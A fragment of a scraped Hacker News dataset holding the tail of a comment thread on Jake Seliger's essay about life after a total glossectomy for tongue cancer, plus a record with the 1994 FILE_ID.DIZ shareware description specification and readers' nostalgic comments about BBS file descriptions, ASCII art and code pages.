no constitutional basis for them). reply Brybry 15 hours agorootparentI think the Commerce Clause is a pretty sound basis for most FDA regulation. It just gets weird with the overbroad supreme court decisions that are like: \"well, stuff that only happens in a single state but that might be used for interstate commerce or somehow impact interstate commerce indirectly\" is also covered. [1][2] [1] https://en.wikipedia.org/wiki/Gonzales_v._Raich [2] https://en.wikipedia.org/wiki/Wickard_v._Filburn reply baggy_trough 15 hours agorootparentOne can only get from regulating interstate commerce to telling a terminal patient what medicine he may consume by a tortured logical process driven by motivated reasoning. reply UniverseHacker 19 hours agoprevWhat a simultaneously terrible and inspiring story- I wish Jake the best for whatever that is worth in such a terrible situation. If you guys didn't click it, I highly recommend his wife Bess's corresponding post to this one- \"Forever is such a short, long time\" it is one of the best essays I have ever read on love and relationships. There is an incredible amount of wisdom in what she wrote, that can only have come out of living through incredible hardship. It literally made me cry, and I am going to quote her in my wedding vows I am writing. reply squigz 18 hours agoparentThe essay in question: https://bessstillman.substack.com/p/forever-is-short-long-ti... reply uxcolumbo 20 hours agoprevI don’t really know what to say, it’s hard for me to fathom what you had to go through. The bit you wrote about having to spit in a cup for the rest of your life, really brought it close to me how much we take for granted. I admire your strength. I wish the best for you and your wife. reply jseliger 19 hours agoparentThank you! I wish I felt strong; I had a friend from high school visiting this weekend, and he said that my strength is inspirational. I looked around wondering if he was talking to someone else, but in fact I was the only person in the room. reply kelnos 16 hours agorootparentThis makes me think about the saying about how being brave doesn't mean not being scared, it means pushing through the fear and doing what has to be done anyway. I feel like it's similar to your strength. From your writing I gather you've had more than your share of bad days, emotionally, during this ordeal. But you're still here, still writing, still posting here, talking to random strangers on the internet. And you and your wife's drive to document all this so others can better navigate the clinical trial process in the future... yeah, absolutely, this is strength, and a lot of it, even if you don't feel strong. Anyhow, for what it's worth, know that there are random people on the internet who follow your story from afar, and that we're rooting for you. reply DougN7 17 hours agorootparentprevSometimes it seems like there is no choice but to be strong. But in reality someone could choose to give up and give in and quit. Not making that choice is what we admire in people, and you in particular. reply majormajor 16 hours agorootparentprevIn my experience people confuse \"what the fuck else am I supposed to do?\" with \"strength\" a lot in ways that are ... not as helpful as they think they are. See also, in the not-so-helpful department: \"you're so lucky [to not be dead yet]\" when luck would've not been being so close to death in the first place. I also don't really understand how it's supposed to be inspirational but I wish you the best and hope you make it through to the other side to the full recovery phase. reply yahoobing 18 hours agoprevOne thing I get from this is you need to be really on the ball when you are this sick. Make hard decisions, do tonnes of research and so on. It is probably important to have support people who can “Karen” for the need of a better word the medical and insurance system when it isn’t working. Probably could be a job in itself. Probably is. The follow on is it helps to be wealthy before you get sick. reply lr4444lr 19 hours agoprevThat's it, I'm going talk to my doctor about getting the Galleri test. I was already on the fence, but this is the straw that breaks the camel's back for me. (It isn't advertised as targeting his specific cancer, but goddamnit, I need some peace of mind.) reply polishdude20 19 hours agoparentIs it available? reply epmatsw 17 hours agorootparentIt is! I got one for $750-ish about a month ago. reply rblatz 15 hours agorootparentDo you have to be over 50 to take it? reply mdorazio 14 hours agorootparentLooks like no, but you're more likely to have to go the online provider route which is $950. https://www.galleri.com/patient/the-galleri-test reply ChrisMarshallNY 21 hours agoprevThat sucks, but his attitude is great, and that’s really important. I sincerely wish him well, and appreciate the note. I had a coworker that had the same thing. Watching him deal with it was difficult. reply jseliger 19 hours agoparentI had a coworker that had the same thing Oh man, I hope he or she was okay. This is terrible. In most people in whom squamous cell carcinoma of the tongue gets caught early, it's curable. I'm in the group in whom it's caught relatively early, but the initial surgery and radiotherapy isn't enough. Regarding attitude, I figure that there is much I can't control, but attitude is one I can. WWMAD? (Would would Marcus Aurelius Do?): https://jakeseliger.com/2023/09/18/stoic-philosophy-finding-...: You’ll see stoic ideas threaded through the essays my wife and I have been writing about my fatal cancer diagnosis: “Every day I’m trying to make a good and generative day, and I remind myself that there are many things I can’t control, but, as both Frankl and the Stoics emphasize, I can control my attitude.” One way to see the virtues of this attitude is by process of elimination: What’s the alternative? Wallowing in bad days in which I accomplish and achieve nothing important? Getting angry about things I can’t control, and things that will remain the same whether I’m angry about them or not? Lamenting that which cannot be, and will not be no matter how much I wish it so? Nothing will bring my tongue back. Bemoaning my fate will not avert it (though I’m also not passively accepting fate: as described below, I appear to be in a clinical trial for a novel, promising drug that targets squamous cell carcinoma of the tongue). The likelihood of another decade of life is not literally 0.0, but it’s under one percent and would require a series of near-miracles via clinical trials. reply ChrisMarshallNY 18 hours agorootparentIt was a \"he,\" and it was not OK. I think it was fairly advanced, by the time it was diagnosed. The guy was a health nut, and avoided doctors like the plague. I won't go into details about what he went through. Not fun. I sincerely wish you the best. I live on Long Island, and have been watching folks battling cancer, constantly, since 1990 (when I moved here). reply rblatz 15 hours agorootparentI’m sorry, but would you mind clarifying that last statement? Is Long Island a hotbed of cancer? Did you move to Long Island to work with cancer patients? reply minitoar 13 hours agorootparentYes, Long Island is known for having cancer clusters. reply tylergetsay 21 hours agoprevAnyone who goes through something like this is an inspiration to those they interact with. I wish the absolute best for you. reply nyokodo 19 hours agoparent> an inspiration to those they interact with Indeed, those who confront suffering with courage encourage the rest of us. reply Dylan16807 19 hours agorootparentWhat does it look like for someone to confront a situation like this without courage? To be clear, I'm not really talking about this story in particular, but the way people discuss other people in really bad situations. It seems like almost any reaction that isn't \"lie there motionless\" gets called \"courageous\". I guess it feels more like a pep talk than an evaluation. reply jseliger 18 hours agorootparentI'm not 100% sure, but I've heard from oncologists and other docs that people with bad diagnoses often lash out at doctors and family who are trying to help them. Some people also go into denial about what's happening, and denial can be fatal. This is not quite 100% on point, but my wife wrote a story about meeting a patient whose large mass on the side of her neck had not been there for just a couple days: https://bessstillman.substack.com/p/just-because-you-wont-se...: \"Per triage, my patient’s symptoms started yesterday and she’s worried that the swelling might be an infection or maybe a pulled muscle, but the moment I walk into the room I know that I’m going to ruin her life.\" Some attempt to take the hedonic path that would not, I think, be very satisfying, and yet they pursue it (heedlessly spending down cash on trinkets, the non-prescribed drugs you might imagine, Vegas, etc.). This is distinct from someone who decides: \"I've always wanted to visit Tokyo and now I'm finally going to do it.\" I think it's good to try and lead and positive, generative life, even when what is left of that life is limited, and when what \"positive, generative\" means will vary widely by person. reply nyokodo 18 hours agorootparentprev> What does it look like for someone to confront a situation like this without courage? There’s a lot of dark places people can go and choose to stay when they experience tragedy. Drugs, alcohol abuse, suicide, wallowing in misery etc. Perhaps you’ve never experienced tragedy, or been tempted by these dark reactions but for many they are all too familiar and it takes enormous courage to combat them. Seeing examples of others who are suffering reacting positively is greatly encouraging. reply ChemoCoward 16 hours agorootparentI was diagnosed with cancer in 2013. I had many surgeries, lots of radiation therapy, and like the woman in \"Brazil\", my complications developed complications. I feel I received excellent care, and I have had no tumors spotted in 8-ish years. But I've been in pain every waking hour of every day since May 16th 2013. Sometimes the pain isn't too bad, sometimes I lie in bed, legs rigid with pain, and scream. If I get a serious recurrence of my cancer, or a new cancer, I'm going to blow my brains out. I can't conceive of anything occurring in my future that would make it worth going through a multi-year episode of surgeries and other aggressive cancer treatments again. reply yard2010 8 hours agoprevI don't know you but I love you. I wish I could help you even feel those feelings for you. Hang in there reply osmano807 17 hours agoprevThanks for your experience, that's important to remind us (me) of the other side. Sometimes I feel really sad that the bus factor of some treatment is 1, and double sad when that one is me. No one should have delayed care just because I need my vacation, or my day off. Kudos to the surgeon who trusted his instincts and suggested a surgical biopsy, sometimes patients get so happy with dubious results that we feel like we're removing their happiness, or that we're secretly hoping for the worst. I hope that you're going through this with peace of mind. reply presentation 14 hours agoprevWhat was the original reason you got that PET scan that led to the cancer diagnosis? Just random luck that you happened to even discover it? Scary stuff reply cultofmetatron 9 hours agoprevhad to look up what a glossectomy is. all I can say is OOF... there are few things I wouldn't rather lose than my tongue. reply boppo1 19 hours agoprevGood post. reply belkarx 11 hours agoprev [–] How does one even find doctors who actually care? seems like luck that you managed :( reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Jake Seliger marks the one-year anniversary of his total glossectomy, a surgery to remove his entire tongue due to aggressive squamous cell carcinoma.",
      "Initially expecting a partial removal, Jake and his partner Bess married the night before the surgery, which ultimately became a total glossectomy on May 25, 2023, due to the tumor's rapid spread.",
      "Post-surgery, Jake faced numerous challenges, including additional tumors, chemotherapy, and clinical trials, reflecting on the physical and emotional toll, the support received, and his ongoing struggle for recovery."
    ],
    "commentSummary": [
      "A user shared their experience of surviving a year after a total glossectomy due to recurrent and metastatic head and neck cancer, emphasizing the lack of patient perspectives in clinical trials.",
      "The discussion criticized the FDA for delaying the approval of promising treatments like Moderna's mRNA-4157, attributing it to bureaucratic inertia, and debated the balance between drug safety and approval urgency.",
      "Personal stories highlighted the emotional and financial burdens of cancer, the importance of a positive attitude, and the courage required to face severe illnesses, with empathetic responses to the user's chronic pain and thoughts of suicide."
    ],
    "points": 275,
    "commentCount": 50,
    "retryCount": 0,
    "time": 1716756410
  },
  {
    "id": 40484930,
    "title": "FILE_ID.DIZ: Standardizing Shareware Descriptions for BBS Distribution",
    "originLink": "http://pcmicro.com/getdiz/file_id.html",
    "originBody": "FILE_ID.DIZ Version v1.9 by Richard Holler [CIS 73567,1547] Last Revision 05/17/94 This HTML file was prepared at the request of the ASP (Association of Shareware Professionals), but the information contained in it may be of value to any shareware author. FILE_ID.DIZ INFORMATION ----------------------- Basically, the FILE_ID.DIZ file is a straight ASCII text file, distributed inside your distribution archive file along with your program files, which contains a description of your program. This file will be used by most BBS (Bulletin Board System) softwares for the online file description of your file. We recommend that the FILE_ID.DIZ file be used in all of your distribution archives. This text file contains a description of the FILE_ID.DIZ file, as well as a description of the recommended distribution archive format. WHY SHOULD YOU USE FILE_ID.DIZ? ------------------------------- The use of this file will insure that the online description of your program will be in your own words (and who better to describe your program than yourself?), and that it will remain the same no matter how many different people upload your file to various BBS systems. As more and more BBS software makes use of this file, you can be assured that your own description will replace such online descriptions as \"Cool Program\" or \"OK utility, but needs better ...\" Please note that the ASP Hub Network, the Author Direct FDN (File Distribution Network), and the majority of other electronic distribution services *REQUIRE* that a valid FILE_ID.DIZ file be contained in your submitted distribution archive. If your file doesn't contain a valid FILE_ID.DIZ file, then it simply won't be distributed by these services. Furthermore, most BBS sysops will not accept uploads of files which do not contain a valid FILE_ID.DIZ file, so you automatically lose out on that distribution as well. DESCRIPTION: ------------ FILE_ID.DIZ was created by Clark Development for use with their PCBDescribe utility, as a means for shareware authors to provide descriptions for their products, and thus so that BBS callers can upload the file(s) without having to manually type in a file description. As long as an author creates and includes a FILE_ID.DIZ file in their distribution fileset, the text from that file will be used for the online description (in most cases) rather than anything typed in by the uploader. It also ensures that the online description is always the same regardless of the number of different BBS systems the file is posted on. It has since been accepted by the BBS industry more-or-less as the \"standard\" file description source. (The extension of \"DIZ\" actually stands for \"Description In Zip\"). NOTE: The FILE_ID.DIZ file *MUST* be named exactly that, and *NOT* something like .DIZ. It will *ONLY* be used if it is named FILE_ID.DIZ! The FILE_ID.DIZ file is nothing more than a straight ASCII text file which contains the full description of the archived file containing it. It is used by most popular BBS software to describe your program, rather than using the description supplied by the person that uploaded your file. It should be placed *INSIDE* your distribution archive file. The FILE_ID.DIZ file is defined by its creators (Clark Development) as being created by the program author, and *NOT* the end user who is trying to upload the program. The BBS software will \"look\" inside the archive file. If a FILE_ID.DIZ file is found, it will replace any existing online file description with the text contained in FILE_ID.DIZ. It is an excellent method for making sure that your program files are described the way that \"you\" want them described. Even sysops who's software can't automatically make use of the FILE_ID.DIZ file have found it to be an excellent source for their manually added file descriptions. STRUCTURE: ---------- The file consists of straight ASCII text, up to 10 lines of text, each line being no more than 45 characters long. It should *NOT* contain any blank lines, any form of centering or formatting, or any Hi-ASCII or ANSI characters. (i.e. it should ONLY contain alpha & numeric characters). We recommended that it consist of 5 basic parts: 1. the proper name of your program 2. the version number 3. the \"ASP\" identifier (optional, for ASP members) 4. the description separator 4. the description All of the above parts should be separated by a single \"space\". PROGRAM NAME: To set it apart from the rest, it is recommended that you use ALL CAPS for the program name. VERSION NUMBER: The version number should be in the form of \"v12.34\". ASP IDENTIFIER: If you are an ASP author, we recommend that an \"\" identifying mark be added after the version number, to identify your product as an ASP-authored product. DESCRIPTION SEPARATOR: To separate the actual description text, insert a simple \"-\" (dash/minus) character after the ASP identifier (or version number, if not using the ASP identifier), and in front of the description text. DESCRIPTION: You should attempt to FULLY describe your product, including its most important functions and features. Be sure to include anything which will separate your program from it's competition, and make the BBS user want to download your file. Also try to include any hardware or software requirements that your product may have. You should try to use the first 2 lines of the text to give a basic description of your program. This is helpful for sysops who's BBS software limits them to less than 10 lines, 45 characters. Sysops who are limited to using shorter descriptions can simply use the 1st two lines and truncate the rest. Thus, you can basically still supply your own description for BBS software which does not actually utilize the FILE_ID.DIZ feature. The remaining lines of text can be used to elaborate on the programs features, enhancements from the prior version, information concerning multi-file sets. Please note that older versions of some BBS software can only use 8 lines of text. It is advisable that you create your FILE_ID.DIZ file so that the file can be truncated to various line lengths without destroying it's usefulness. EXAMPLE ------- MY PROGRAM v1.23 - A program which will do anything for anybody. Will run in only 2k of memory. Can be run from the command line, or installed as a TSR. Completely menu- driven. Version 1.23 reduces the previous 4k memory requirements, and adds an enhanced graphical user interface. Also, MY PROGRAM now contains Windows and DESQview support. Coming soon - an OS/2 version. From Do-It-All Software, Inc. $15.00 MULTIPLE DISK INFO ------------------ Please note that if your distribution archive requires multiple archive files, you should create a separate, specific FILE_ID.DIZ file for each archive. This can be utilized to describe the various contents of each archive, and to identify each disk in the set. For example, the FILE_ID.DIZ file for disk #1 could contain: \"MY PROGRAM v1.23 Program Executable Files - Disk 1 of 2\" [followed by detailed description text] while the FILE_ID.DIZ file for disk #2 could contain: \"MY PROGRAM v1.23 Documentation Files - Disk 2 of 2\" [followed by more detailed description text] Optionally, you could also create a \"complete\" FILE_ID.DIZ file for the first disk, which would fully describe the program in detail, and identify it as Disk 1 of x. Then, for each remaining file in the set, simply include the Program Name, version number, ASP identifier, and the disk number (i.e. \"MY PROGRAM v1.23 Disk 2 of x\"). ADDITIONAL INFO --------------- Please don't be tempted to use fancy graphic or ANSI sequences in the FILE_ID.DIZ file, as most BBS software will not allow this, and will render your FILE_ID.DIZ file useless. Also, don't be tempted to simply copy your program description file to FILE_ID.DIZ. Attempting to \"format\" your FILE_ID.DIZ file (i.e line centering, right & left justification, etc) will also cause unexpected results, especially for BBS software which re-formats descriptions to other than 10line/45char. Fred Hill has written a freeware utility which interactively creates a valid FILE_ID.DIZ file. The file is called DIZGEN.ZIP, and is included with this distribution archive. I highly recommend that you use this utility for creating your FILE_ID.DIZ files.The following is a recommendation for the structure and contents of distribution archives prepared for use on BBS systems. DISTRIBUTION DISK RECOMMENDATIONS --------------------------------- The following are recommendations for preparing your program files for distribution to Bulletin Board Systems (BBSs) via the ASP's distribution services, as well as other methods. Two varieties of program files are defined here: 1) Program files which utilize an \"install\" utility and self-extracting program archives (later referred to as \"Author-Installed Programs\"). 2) Programs files which do not use install utilities or self-extracting archives (later referred to as \"User-Installed Programs\"). AUTHOR-INSTALLED PROGRAMS: -------------------------- These programs require a bit more work from the author, but will eliminate many user mistakes, especially in programs which require complicated setups. Most \"installation\" utility programs will make use of program files which have been \"archived\" into Self-Extracting (SFX) archives. We will attempt to define which files should be contained in the Self-Extracting archives, and which files should not. 1. Files which should be contained in the self-extracting program file archive: a. All program-specific executable files. b. Any required configuration and/or data files required by the program. c. Program documentation files. Optionally, these may be left outside of the self-extracting archive, in order to allow them to be viewed/read by the various archive viewing utlities. d. Any other program-specific files that are required for the operation of the program. 2. The files described above should be compiled into a self-extracting archive file, which will then be extracted by the install utility. NOTE: the author is required to abide by any distribution requirements specified by the archive utility author, and to obtain any required distribution rights necessary. Please check to see if distribution rights are required for your archive utility choice. 3. Files which should NOT be contained in the self-extracting program file archive: a. The install utility itself (obviously). b. The FILE_ID.DIZ file. (described in detail in the section preceding this one) c. Any distribution/information files, such as VENDOR.TXT, SYSOP.TXT, etc. d. Any description or information file, such as DESCRIBE.TXT. e. A user file (such as README.1ST), which should explain how to use the install utility, what the user should expect during the installation, and any preparation that the user should make prior to the installation. This file might also contain a brief description of your program, in case the user is able to read the documentation files in the distribution archive prior to downloading (many BBS systems offer this ability to the user). 4. The actual distribution archive file (described below) should then contain the install utility, the self-extracting program archive, and the files described in #3 above. USER-INSTALLED PROGRAMS: ------------------------ This type of distribution archive is much simpler than the Author-Installed variety. It should simply be an archive file, containing all of the files for the program described above. Since this type of program requires the user to do all of the installation manually, it should contain very specific and detailed information regarding the installation requirements (such as INSTALL.TXT). THE DISTRIBUTION ARCHIVE FILE: ------------------------------ The actual distribution archive file should merely be an archive file containing the files described above. For BBS distribution, this archive should be of the standard archive format, and -NOT- a self-extracting archive. Many sysops will not allow self-extracting archives, and most BBS software will not allow self-extracting archives to be uploaded. There are many popular archive utilities available, such as PKZIP, LHA, LHARC, ARJ, etc. Most BBS systems are capable of handling archives in virtually any format. However, you should be aware that most BBS systems will convert your archive format to the format of choice by the sysop. By following the methods described above, this conversion process should not affect your program, or any self-extracting files which are contained within your distribution archive file. You should also retain the default archive file extension defined by the archive utility. For example, PKZIP uses a \".ZIP\", LHARC uses \"LZH\", etc. Changing the file extension may cause the BBS software to delete your file because it doesn't recognize the format. For the actual filename for your distribution archive, it is recommended that the program filename be limited to 6 characters to represent the program's name (i.e. MYPROG could represent \"My Program\"). This should be followed by 2 numeric digits which will represent the version number of your release. Even if this is your initial release it should include the version number in the filename (i.e. MYPROG10.ZIP would indicate the program called \"My Program\" version 1.0). Please note that CompuServe limits filenames to only 6 characters. By limiting the file \"name\" to 6 characters, you will easily be able to rename the archive for CompuServe uploading by simply removing the 2-digit version identifier, to make the file compatible with CompuServe libraries. By including the 2-digit version number in the archive filename, it will be very easy for both the user and the sysop (and yourself) to identify older versions of your program. MULTIPLE DISTRIBUTION ARCHIVES ------------------------------ At one time, it was recommended that your final distribution archive not be larger than 350k, so that it would fit on a single 360k floppy disk and still leave room for any distribution files necessary for Disk Vendors. (i.e. Disk Vendors will often include their own GO.BAT file, or other various small files to help their customers install the software). This limitation is slowly falling by the wayside as more and more computer systems have 3.5\" floppy disk drives as standard. If your program is large enough to require more than one distribution archive, it is recommended that your filename be limited to 5 characters rather than 6 as described above. Following the 5-character name should be the same 2-digit version number. Then, append a single \"letter\" to identify the disk (i.e. MYPGM10A.ZIP, MYPGM10B.ZIP, etc.). For uploading to CompuServe, these filenames may then be shortened to 6 characters by removing the version identifiers (i.e. MYPGMA.ZIP, MYPGMB.ZIP). However, for CompuServe it is recommended that you simply create a single distibution file, and eliminate the multi-part file set. If your program requires multiple distribution archives, -BE SURE- to create separate FILE_ID.DIZ files for each distribution archive. Also, each FILE_ID.DIZ file should contain disk number information pertaining to each individual archive (i.e. Disk 1 of 3, Disk 2 of 3, etc.). THE DISTRIBUTION DISK --------------------- It is recommended that your distribution disk simply contain a ZIPd version of your product. However, If you choose to supply \"unarchived\" files on a distribution disk for Disk Vendor use, it is _VERY_ important that you specify in your documentation a suggested archive filename, so that BBS sysops can create archived files with the proper author-specified filenames. This information should be contained in your SYSOP.TXT (or VENDOR.TXT) file. If you don't supply a suggested archive file name, the sysops will be forced to create the name themselves, thus you may end up with thousands of versions of your products on BBS systems all over the world, but all with different filenames. Please note that the ASP Hub Network, and nearly every other electronic distribution service *REQUIRE* that your files be submitted as an archived file, using the ZIP format. Also note that many BBS sysops will not go to the trouble of ZIPing your unarchived files for you. If you don't supply them with an archived distribution version of your product, it might not get distributed by BBSs. If you supply your own disk labels, it is recommended that the ASP logo, or at least the initials \"ASP\" be included on the label, so that anyone can immediately identify your disk as an ASP member's software. SUMMARY ------- Your distribution disk should now be ready to submit to the various BBSs, distribution services, and Disk Vendors. You may choose to create a separate distribution disk for use by BBSs and Disk Vendors. However, if you follow the above steps in preparing your distribution archive file, a separate \"Disk Vendor\" disk is probably not necessary. The majority of disk vendors will be able to accept your distribution file/disk if it is prepared in the above described format.",
    "commentLink": "https://news.ycombinator.com/item?id=40484930",
    "commentBody": "FILE_ID.DIZ Description (1994) (pcmicro.com)231 points by Lammy 23 hours agohidepastfavorite75 comments Joker_vD 21 hours ago> (The extension of \"DIZ\" actually stands for \"Description In Zip\") Ah, finally, another puzzlement from my childhood explained. reply foresto 15 hours agoparentI assumed it was because \"diz\" was \"zip\" rotated 180°. \"Description In Zip\" seems like it could be a backronym. reply lloeki 13 hours agorootparentI remember those as far back as filesystems were 8.3 all caps, so D would not rotate to P though. reply foresto 13 hours agorootparentI think the way it was conceived is orthogonal to the way it is encoded or displayed. reply b3lvedere 11 hours agorootparentprevI have seen thousands and thousands of those files and until now it never clicked that you could kinda rotate 180° that. Thank you! reply wengo314 10 hours agorootparentprevi just thought it was \"this\" shortened to DOS standards. reply weinzierl 9 hours agorootparentSame, and still makes the most sense to me. \"Description In Zip\" has the typical clunkiness of a backronym and the 180° theory suffers from the fact that filenames (as lloeki rightfully pointed out) were usually presented in all uppercase (even when lowercase was available) in that era. Phonetically shortening stuff on the other hand was almost a requirement in the scene, even if you had the space. EDIT: Thinking about it \"identify this\" is well in line with \"read me\". reply xnx 7 hours agorootparentprevSingular of \"deez\" reply cdchn 19 hours agoparentprevI was under the impression the DIZ was because it first appeared on a BBS called DiZZYboard iirc reply fullstop 21 hours agoparentprevAs a kid, I always assumed that it was \"description\" but in some other language which I was unfamiliar with. reply ahartmetz 10 hours agorootparentI thought it was leetspeak for \"this\", so FILE_ID.DIZ was \"file to identify this\" reply spitfire 20 hours agorootparentprevLeetspeak. As a kid, you should have known leetspeak. reply xtracto 16 hours agorootparentI think .diz preceeded leetspeak by a couple of years. reply euroderf 12 hours agorootparentprevFWIW, leetspeak is just a calligraphic flourish away from feetspeak. reply dylan604 20 hours agorootparentprevYes, but which color book was this term first used? Then we'll establish how l337 you are or are not reply fragmede 20 hours agorootparenthttps://www.youtube.com/watch?v=4U9MI0u2VIE https://retrocomputing.stackexchange.com/questions/10997/wer... great scene. reply herodoturtle 12 hours agorootparentI’m the biggest fan of Hackers but that scene has always irked me. They’re all so impressed with Dade’s knowledge yet he simply appears to be reading the cover title of each book as it gets passed. Someone please give me a meta explanation that justifies this so that my inner fanboy can sleep better at night. I’ve probably watched Hackers 100s of times. Best love story ever. reply fragmede 2 hours agorootparentphysical books weren't just given away to anyone who asked back then, so getting a copy of one is an achievement in the first place so the assumption is if you got it, you read it and by reading the title out loud he's saying I know what's in those books, like the anarchist cookbook reply doublerabbit 4 hours agorootparentprevThe nicknames given to each book is what he's being tested on. \"The dragoon book\", \"That ugly red book that wont sit on the shelf\" and so on. reply bytearray 20 hours agorootparentprevUm, I think you mean 1337 reply Scotrix 20 hours agorootparentnot to be mistaken with 31337 ;-) reply 31337Logic 18 hours agorootparentOh, hi there! ;^) reply lloeki 13 hours agorootparentprevI assumed it was short for \"distribution\", stylised. reply ale42 8 hours agoparentprevLol, when I was seeing them around as a teenager I was thinking to DIZ as \"dizionario\" in Italian (dictionary)... of course, had I thought a bit more, I could have figured out that it was probably not Italian. reply BennyH26 21 hours agoparentprevSame here. This is the first thing I looked up when I saw the article. reply drbig 21 hours agoparentprevIndeed! reply jzzskijj 12 hours agoprevThis made me chuckle: > Please don't be tempted to use fancy graphic or ANSI sequences in the FILE_ID.DIZ file, as most BBS software will not allow this, and will render your FILE_ID.DIZ file useless. Everyone was doing exactly that and even I did something like +hundred artsy file_id.diz headers for the scene groups or my own groups. When \"releases\" started to be from 5 to 15 disks (packages), many sysops started to clearing the art away from the file lists and just leaving an oneliner of the title visible, like: The Name of The Release Disk: [03/12] Interesting too that as niche as they are today, they are still being made. The last ones I did was in 2015. reply alkonaut 9 hours agoparentI was adult years old when I realized all those big walls of gibberish I saw in my youth was intended to be elaborate graphics, but my computer had the wrong charset to show them. reply jzzskijj 6 hours agorootparentHuh! Which system you were using? Notepad in Windows or Linux? reply cesarb 4 hours agorootparentI would guess MS-DOS. Back then, there was no UTF-8, and the character encoding depended on your language. People using English normally were using CP437 (https://en.wikipedia.org/wiki/CP437), while people using other languages would be using something like CP850 (https://en.wikipedia.org/wiki/CP850). Take a look at the encoding tables in these two articles, and notice that CP437 has lots of line and box drawing characters in the high half, while CP850 replaces many of them with accented letters. If the file was written on a system using CP437, and used these line/box drawing characters, then someone on a system using CP850 would see random letters where the author intended fancy boxes around their text. (This was due to a limitation of the text modes used to run MS-DOS: each character on the 80x25 fixed-size grid shown on the screen was described in memory by a single byte which was a index into the font table, plus another byte for attributes like color and intensity. That means there could be at most 256 distinct characters, and no way to combine separate characters into one. To add all the accented letters necessary for many languages, something had to be removed; and what was removed were the less important line and box drawing characters. That is very different from the graphical modes common nowadays, which store the color of each pixel separately in memory, and allow infinite variation on the character shapes.) reply alkonaut 4 hours agorootparentprevDos and later Windows. Unsure which code pages were used but this was in Sweden. reply jzzskijj 6 minutes agorootparent> Unsure which code pages were used but this was in Sweden. Interesting. Every PC I ever used in Finland (home, school, friend's, etc.) were always using https://en.wikipedia.org/wiki/Code_page_437 and I would have assumed every PC in Sweden did too. Maybe your did have cp850 or something uncommon. reply blackhaz 11 hours agoparentprevHehe. Here's a cool FILE_ID.DIZ collection: http://www.roysac.com/fileid_col.html reply nuancebydefault 1 hour agorootparentReal nice ascii art collection! reply jasonfarnon 11 hours agoparentprevWhen \"releases\" started to be from 5 to 15 disks I can remember this, scrolling through page after page of the same release since only 3 or 4 big \"PWA\" or \"FLT\" logos could fit on a page. I remember more or less the same visual style as graffiti from the era. I had no idea this stuff was still happening in 2015. reply kemitchell 18 hours agoprevThe whole history of shareware was badly neglected along my path into the industry, as if all those people set sail sometime in the 1990s and were never heard from again. In fact they continued in parallel, and still show very obvious influence in many niches of software. I think that was just hard to see while I was at uni. I can strongly recommend Richard Moss' Shareware Heroes book for those interested in remedial reading, and not just for those devoted to games. If there are any computer history grad students lurking, an integrative history of early software distribution models and industry orgs is still a big, gaping hole in the lit, as far as I know. reply ghaff 17 hours agoparentEssentially it was a parallel track in the BBS world. And it ended up dying/morphing into the sort of trial-ware etc. that the \"true\" shareware movement was largely against. The whole thing just sort of fizzled out as open source was becoming more prominent but, even as someone who was a part of it, it's not totally clear to me how that transition came about. With a few exceptions like Jason Scott's BBS documentary, the non-Unix/Internet history of early personal computing is not very well-covered at all. reply DeathArrow 12 hours agoprevIn a world where we increasingly don't own software but we rent it, is hard to imagine that shareware even existed. As a kid I remember playing only first level of Doom, because it was distributed as a shareware and didn't have money to buy the game. I remember saving money and buying computer magazines and then installing all the shareware they had on floppy disks, out of curiosity. For me the discovery process was fascinating. reply rob74 11 hours agoparentThen you must be misremembering... the shareware version was the first episode, which was around a quarter of the final game. This practice was started by Apogee (who published, amongst others, Wolfenstein 3D) and then continued by id software for Doom and Quake. reply nuancebydefault 1 hour agorootparentWhat I remember is a title ascii screen (yellow letters against a red background or something the like) stating 'if you copy Doom, you will go to hell'. I'm pretty sure I got a copy of the complete game. I guess a lot of people will be going to hell. reply thesnide 11 hours agoparentprevBah.. we just don't call it shareware anymore, but freemium. And mission disks are called DLC. Which also work with DRM free content. DRM and renting feels like short term gain to me. reply AdamH12113 20 hours agoprevPedantic note: This appears to be a text file that was improperly converted to HTML. The body contains text in angle brackets that is not visible when viewing in a web browser, mainly themark for the Association of Shareware Professionals. You can properly see the original text by viewing the page source. reply rav 13 hours agoparentPerhaps the eminently usefultag hadn't been invented in 1994 :-) reply unwind 12 hours agorootparentThe file self-describes (in the first line) as being HTML, so not using characters that don't work in HTML seems like a sensible requirement. Strange that nobody noticed and fixed it, earlier. Perhaps browsers of yore (heh, I was there so that sounds strange) did render the elements in question since they were less strict? reply deaddodo 7 hours agorootparentHTML1.1, HTML2, etc weren't less strict, if anything they were more. They only consumed tags that could be rendered, since there wasn't a concept of a DOM tree or anything like that. They just worked forward rendering as they went. CSS and JavaScript introduced the need for a DOM tree and mutable state, in which case HTML renderers treated HTML docs more like XML descriptor files than SGML. reply ruslan 3 hours agoprevI totally like their example, let me cite it here: ------- MY PROGRAM v1.23 - A program which will do anything for anybody. Will run in only 2k of memory. Can be run from the command line, or installed as a TSR. Completely menu- driven. Version 1.23 reduces the previous 4k memory requirements, and adds an enhanced graphical user interface. Also, MY PROGRAM now contains Windows and DESQview support. Coming soon - an OS/2 version. From Do-It-All Software, Inc. $15.00 Just $15.00 for such a software gem with 2k mem requirements. I would surely pay for an OS/2 version. :) reply Clubber 2 hours agoparent> A program which will do anything for anybody...$15.00 Such a bargain! reply jolmg 14 hours agoprev> A user file (such as README.1ST), which should explain how to use the install utility, what the user should expect during the installation, and any preparation that the user should make prior to the installation. This file might also contain a brief description of your program > might There's times where I find a random codebase and the README talks about how to install it without first giving some idea on what it is. I guess that's not new. reply Sembiance 4 hours agoprevHere is a collection of 1.1 MILLION FILE_ID.DIZ files from back in the day: https://discmaster.textfiles.com/search?q=FILE_ID.DIZ&qfield... reply csense 20 hours agoprevI saw plenty of FILE_ID.DIZ's back in the day. Interesting bit of history to find out more! (Even decades after it's become irrelevant) reply bni 11 hours agoprevDidn't know these had Shareware origin, always thought it was a Warez thing. These were a hassle when unzipping and you always got the question if you wanted to overwrite or not. reply PostOnce 15 hours agoprevlots and LOTS of these and more can be enjoyed at https://defacto2.net/home along with much more retro underground history. reply PostOnce 12 hours agoparentOn second thought and too late to edit, a direct link to a relevant search https://defacto2.net/search/result?search=all&query=file_id.... There are also zip files with collections of .diz files, etc reply asveikau 20 hours agoprevI completely forgot this was a thing, but its existence was etched in my brain. I wasn't aware that anybody read those files. The name would fly by when extracting a zip, but that's it. reply Sharlin 8 hours agoparentWell, their whole point was to be read and displayed by BBS software (and later by some early download websites I guess) to help users decide what to download in the first place, so they were indeed not expected to be opened by the user after downloading. reply Agingcoder 10 hours agoparentprevI did. Before the internet, 